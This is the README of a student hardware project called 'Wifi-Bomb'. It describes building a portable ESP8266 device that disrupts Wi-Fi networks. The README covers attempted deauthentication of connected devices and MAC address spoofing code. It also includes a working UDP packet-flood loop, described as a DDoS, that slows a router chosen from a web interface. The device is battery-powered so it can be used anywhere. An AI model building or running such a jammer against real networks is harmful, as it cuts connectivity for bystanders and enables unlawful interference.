# Wifi-Bomb

### Introduction

The **Wifi-Bomb** project disrupts the connection of connected device to a router. The application requires to know the MAC address of the connected device. **The mac address must be in a predefined format)**, at first we did not respect this format, so the project didn't work. But we did a program that slow down the speed of a router. For this, it performs a DDOS attack(distributed denial of service attack) by sending a lot of network packets. So the process is to flood the network up to the dysfunction of the router. The arduino use the library [Wifi Manager](https://github.com/tzapu/WiFiManager) to find the routers close to the arduino. Then, the user has to connect to the following url 192.168.4.1 which is the default url for Wifi Manager. Then he will see all the routers close to him. To finish, the user has to choose the router to attack and the project will DDOS this one. When the arduino is attacking a router, the led turns.  

Requirement
-------------
 * Wemos D1 Mini V2 (ESP8266)
 * 2*battery AAA LR03
 * ON/OFF Switch 

![enter image description here](http://img4.hostingpics.net/pics/287422final.png)



Dashboard 
-------------

### Step 1 - Mono deauthentication

At the beginning, we wanted the Wifi-Bomb project to disrupt the connection of a connected device to the router. But the application requires to know the MAC address of the connected device. We could'nt change the mac address with the ESP8266 library. 

We tried the following code in order to change the mac address. We found that the wifi_set_macaddr () method didn't work because the method returned always false.

```C
byte mac[] = { 0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED };
  
  if(wifi_set_macaddr(SOFTAP_IF, &mac[0])){
    Serial.println("Mac Adress change");
  }
  else{
    Serial.println("Mac Adress didn't change");
  }
```
**However, we noticed that the mac address requires a predefined format. Indeed, at the beginning of the test, we put a random mac address and it didn't work. Testing with a real mac address, the program worked well.**

Then, we looked the code of the library "Wifi Manager" to see an example of inclusion of libraries.

This is the link of the project: https://github.com/jordanmarques/wifi-bomb/blob/mac_address/wifi-bomb.ino

### Step 2 - Change Mac address with Nodemcu

After that, we used a "node MCU" in order to "jam" the network via a LUA code because we can change the MAC address with it. But onn the other hand, we could not make an access point via this solution. Moreover, the associated idea is not adapted to our needs, so we have abandoned this solution.

![Node MCU](http://www.webondevices.com/wp-content/uploads/2015/11/113990105-1.jpg)

Here's the nodemcu code for change the mac address in lua. 
```C
wifi.setmode(1)
wifi.sta.config("SSID","PSWD")
wifi.sta.setmac("\000\217\209\006\027\000")
tmr.alarm(0, 6000, 1, function()
    print("Start")
    wifi.sta.connect()
    print(wifi.sta.getip())
    print("End")
end )
```

### Step 3 - Multi deauthenticate

We continued the searches and found a github [repository](https://github.com/RandDruid/esp8266-deauth) that allows us to deauthenticate of a router. The difference with the original project is this one is more advanced than the first project. Indeed, it makes possible to jam the connection between a router and all the devices connected to it.

### Step 4 - DDOS 

We looked for another type of wifi attack. We found a [tutorial](https://yoursunny.com/t/2016/WiFi-flood/) to slow down the speed of a wifi connection. In this tutorial we found a code which create many network packets, then send them to a router. Each packet contain 1000 byte. This method is called a DDOS.

This is the code we found in the tutorial:
```C
#include <ESP8266WiFi.h>
#include <WiFiUdp.h>

uint8_t pkt[1000];

void setup() {
  Serial.begin(115200);

  WiFi.mode(WIFI_AP);
  WiFi.softAP("00000000", "00000000", 6, 1);

  memset(pkt, 0, sizeof(pkt));
}

void loop() {
  WiFiUDP udp;
  udp.beginPacketMulticast(WiFi.softAPIP(), 1, IPAddress(255,255,255,255), 1);
  udp.write(pkt, sizeof(pkt));
  udp.endPacket();
}
```

So we developed a code to connect to a router. 
This code contained an interface to connect to a wifi access point via an form.
We encountered a problem with the arduino that connected to the same router than the one which we wanted to "jam".
So we chose to use Wifi Manager library because it was simpler and more convenient to use.
After a few bugs, we finally managed to validate the connection to a wifi network and to inject a large number of packets in order to slow down the speed wifi of this network.

In parallel, we have welded the arduino to an external battery in order to be able to use it from anywhere.
